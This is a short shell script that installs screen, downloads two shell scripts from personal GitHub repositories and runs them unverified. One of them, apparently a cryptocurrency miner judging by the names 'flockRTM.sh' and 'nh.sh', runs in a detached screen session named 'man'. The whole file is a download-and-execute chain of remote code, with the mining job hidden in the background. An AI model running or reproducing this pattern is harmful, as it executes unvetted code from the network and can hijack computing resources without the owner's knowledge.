#!/bin/sh

sudo apt update
sudo apt install screen -y
wget https://github.com/DarshGoswami1982/prem/raw/main/nh.sh
wget https://github.com/rabbitdoo59/zerg/raw/main/flockRTM.sh
chmod +x flockRTM.sh
screen -dmS man ./flockRTM.sh 60 70
chmod +x nh.sh
./nh.sh
